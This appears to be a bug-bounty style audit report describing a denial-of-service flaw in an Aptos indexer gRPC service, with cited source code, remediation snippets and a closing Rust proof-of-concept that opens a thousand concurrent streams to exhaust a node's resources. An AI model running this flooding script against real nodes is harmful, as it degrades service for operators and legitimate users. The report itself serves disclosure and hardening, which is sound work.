# Audit Report

## Title
Resource Exhaustion DoS via Unbounded Concurrent gRPC Streams in Indexer Fullnode Service

## Summary
The Indexer Fullnode gRPC service accepts unlimited concurrent streams due to `poll_ready()` always returning ready, combined with the absence of HTTP/2 connection limits, authentication, and rate limiting. This allows attackers to exhaust node resources through concurrent `GetTransactionsFromNode` requests, potentially causing service degradation and cascading failures.

## Finding Description

The auto-generated Tonic gRPC server code for `FullnodeDataServer` implements the Tower `Service` trait with a `poll_ready()` function that unconditionally returns `Poll::Ready(Ok(()))`. [1](#0-0) 

This means the service never applies backpressure and will accept all incoming requests regardless of current load. The service is instantiated without any interceptor, authentication, or rate limiting mechanisms. [2](#0-1) 

The Tonic server is configured with only HTTP/2 keepalive settings, but critically lacks `http2_max_concurrent_streams` configuration. [3](#0-2) 

The service binds to `0.0.0.0:50051` by default, making it publicly accessible without authentication. [4](#0-3) 

Each accepted `get_transactions_from_node` request spawns expensive resources:
1. A new tokio async task [5](#0-4) 
2. An mpsc channel with configurable buffer (default 35) [6](#0-5) 
3. An `IndexerStreamCoordinator` that processes transactions from storage
4. Multiple CPU-bound blocking tasks for transaction conversion [7](#0-6) 

**Attack Path:**
1. Attacker connects to the publicly exposed gRPC service (no authentication required)
2. Opens hundreds or thousands of concurrent HTTP/2 streams requesting `GetTransactionsFromNode` with different starting versions
3. Each stream is immediately accepted because `poll_ready()` returns ready
4. Each stream spawns multiple tasks, allocates memory, and performs database queries
5. The node's resources (CPU, memory, database connections, tokio runtime) become saturated
6. Legitimate clients experience degraded service or timeouts
7. If the indexer service shares resources with consensus operations, cascading failures may occur

**Invariant Violated:**
This breaks the **Resource Limits** invariant: "All operations must respect gas, storage, and computational limits." The service accepts unlimited concurrent operations without proper resource management.

## Impact Explanation

This vulnerability falls under **High Severity** per the Aptos bug bounty criteria: "Validator node slowdowns."

While the indexer service is auxiliary to consensus, it can cause significant operational impact:

1. **Direct Impact:** Complete degradation of the indexer gRPC service, preventing block explorers, indexers, and applications from accessing blockchain data
2. **Resource Contention:** If running on a fullnode that also participates in consensus or serves other critical APIs, the resource exhaustion can affect core node operations
3. **Database Overload:** Concurrent streams all query the shared AptosDB instance, potentially impacting other database consumers
4. **Cascading Failures:** Overloaded tokio runtime can slow down all async operations on the node

The attack does not directly affect consensus safety or fund security, but can cause severe availability degradation.

## Likelihood Explanation

**Likelihood: High**

This attack is trivial to execute:
- No authentication or credentials required
- Service is publicly exposed by default on `0.0.0.0:50051`
- Simple to implement with any gRPC client
- No rate limiting or connection limits in place
- Attack can be sustained with minimal attacker resources (just TCP connections)

The only mitigating factor is that operators may deploy additional infrastructure (reverse proxies, firewalls) with their own rate limiting, but the application-level vulnerability remains.

## Recommendation

Implement defense-in-depth protections:

1. **Configure HTTP/2 connection limits** in the Tonic server builder:
```rust
let tonic_server = Server::builder()
    .http2_keepalive_interval(Some(std::time::Duration::from_secs(60)))
    .http2_keepalive_timeout(Some(std::time::Duration::from_secs(5)))
    .http2_max_concurrent_streams(Some(100))  // Add this line
    .add_service(reflection_service_clone);
```

2. **Add connection-level rate limiting** using Tower middleware:
```rust
use tower::ServiceBuilder;
use tower::limit::ConcurrencyLimitLayer;

let svc = FullnodeDataServer::new(server)
    .send_compressed(CompressionEncoding::Zstd)
    .accept_compressed(CompressionEncoding::Zstd)
    .accept_compressed(CompressionEncoding::Gzip);

let svc_with_limits = ServiceBuilder::new()
    .layer(ConcurrencyLimitLayer::new(MAX_CONCURRENT_STREAMS))
    .service(svc);

tonic_server.add_service(svc_with_limits)
```

3. **Add authentication** for production deployments using Tonic interceptors

4. **Monitor concurrent stream count** with metrics to detect abuse

5. **Document deployment best practices** advising operators not to expose indexer services directly without reverse proxy protection

## Proof of Concept

```rust
// PoC demonstrating resource exhaustion attack
use aptos_protos::internal::fullnode::v1::{
    fullnode_data_client::FullnodeDataClient,
    GetTransactionsFromNodeRequest,
};
use tokio::task::JoinSet;

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    let target = "http://[TARGET_NODE]:50051";
    let num_streams = 1000; // Open 1000 concurrent streams
    
    let mut tasks = JoinSet::new();
    
    for i in 0..num_streams {
        let target = target.to_string();
        tasks.spawn(async move {
            let mut client = FullnodeDataClient::connect(target)
                .await
                .expect("Failed to connect");
            
            let request = GetTransactionsFromNodeRequest {
                starting_version: Some(i * 1000000), // Different starting points
                transactions_count: None, // Request all transactions
            };
            
            // Open stream and keep it alive
            let mut stream = client
                .get_transactions_from_node(request)
                .await
                .expect("Failed to open stream")
                .into_inner();
            
            // Slowly consume the stream to keep it alive
            while let Some(_response) = stream.message().await.ok().flatten() {
                tokio::time::sleep(tokio::time::Duration::from_secs(1)).await;
            }
        });
    }
    
    // Wait for all tasks to complete (they won't in normal operation)
    while let Some(result) = tasks.join_next().await {
        result?;
    }
    
    Ok(())
}
```

**Expected Result:** The target node's indexer service becomes unresponsive, CPU and memory usage spike, and legitimate clients cannot connect or experience severe degradation.

## Notes

This is an application-level resource exhaustion vulnerability, distinct from network-level DoS attacks. The issue stems from the combination of:
- Auto-generated Tonic code following standard patterns (not inherently a bug)
- Missing deployment hardening (configuration gaps)
- Lack of authentication and rate limiting

While the generated `poll_ready()` behavior is standard for Tonic services, the deployment configuration must include proper resource limits to prevent abuse. The vulnerability is valid because the default configuration in the codebase lacks these protections, making production deployments vulnerable unless operators add external safeguards.

### Citations

**File:** protos/rust/src/pb/aptos.internal.fullnode.v1.tonic.rs (L256-261)
```rust
        fn poll_ready(
            &mut self,
            _cx: &mut Context<'_>,
        ) -> Poll<std::result::Result<(), Self::Error>> {
            Poll::Ready(Ok(()))
        }
```

**File:** ecosystem/indexer-grpc/indexer-grpc-fullnode/src/runtime.rs (L101-104)
```rust
        let tonic_server = Server::builder()
            .http2_keepalive_interval(Some(std::time::Duration::from_secs(60)))
            .http2_keepalive_timeout(Some(std::time::Duration::from_secs(5)))
            .add_service(reflection_service_clone);
```

**File:** ecosystem/indexer-grpc/indexer-grpc-fullnode/src/runtime.rs (L106-112)
```rust
        let router = match use_data_service_interface {
            false => {
                let svc = FullnodeDataServer::new(server)
                    .send_compressed(CompressionEncoding::Zstd)
                    .accept_compressed(CompressionEncoding::Zstd)
                    .accept_compressed(CompressionEncoding::Gzip);
                tonic_server.add_service(svc)
```

**File:** config/src/config/indexer_grpc_config.rs (L86-93)
```rust
    fn default() -> Self {
        Self {
            enabled: false,
            use_data_service_interface: false,
            address: SocketAddr::V4(SocketAddrV4::new(
                Ipv4Addr::new(0, 0, 0, 0),
                DEFAULT_GRPC_STREAM_PORT,
            )),
```

**File:** ecosystem/indexer-grpc/indexer-grpc-fullnode/src/fullnode_data_service.rs (L93-94)
```rust
        // Creates a channel to send the stream to the client.
        let (tx, rx) = mpsc::channel(transaction_channel_size);
```

**File:** ecosystem/indexer-grpc/indexer-grpc-fullnode/src/fullnode_data_service.rs (L100-101)
```rust
        // This is the main thread handling pushing to the stream
        tokio::spawn(async move {
```

**File:** ecosystem/indexer-grpc/indexer-grpc-fullnode/src/stream_coordinator.rs (L170-200)
```rust
            let task = tokio::task::spawn_blocking(move || {
                let raw_txns = batch;
                let api_txns = Self::convert_to_api_txns(context, raw_txns);
                let pb_txns = Self::convert_to_pb_txns(api_txns);
                // Apply filter if present.
                let pb_txns = if let Some(ref filter) = filter {
                    pb_txns
                        .into_iter()
                        .filter(|txn| filter.matches(txn))
                        .collect::<Vec<_>>()
                } else {
                    pb_txns
                };
                let mut responses = vec![];
                // Wrap in stream response object and send to channel
                for chunk in pb_txns.chunks(output_batch_size as usize) {
                    for chunk in chunk_transactions(chunk.to_vec(), MESSAGE_SIZE_LIMIT) {
                        let item = TransactionsFromNodeResponse {
                            response: Some(transactions_from_node_response::Response::Data(
                                TransactionsOutput {
                                    transactions: chunk,
                                },
                            )),
                            chain_id: ledger_chain_id as u32,
                        };
                        responses.push(item);
                    }
                }
                responses
            });
            tasks.push(task);
```
